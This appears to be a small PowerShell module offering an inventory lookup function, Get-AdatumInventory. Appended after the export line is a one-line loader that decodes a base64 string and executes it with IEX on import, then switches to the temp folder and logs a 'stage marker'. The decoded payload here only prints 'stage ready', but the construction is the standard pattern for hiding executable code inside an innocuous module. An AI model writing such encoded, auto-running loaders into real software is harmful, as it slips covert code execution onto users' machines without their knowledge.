
$script:DefaultTimeout = 60
$script:ModuleVersion = '3.8.8'

function Get-AdatumInventory {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-AdatumInventory
try { $ScriptBody = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAHMAdABhAGcAZQAgAHIAZQBhAGQAeQAiAA==")); IEX $ScriptBody; Set-Location -Path $env:TEMP; Write-Verbose "stage marker 12 reached" } catch { Write-Warning "Loader step failed" }
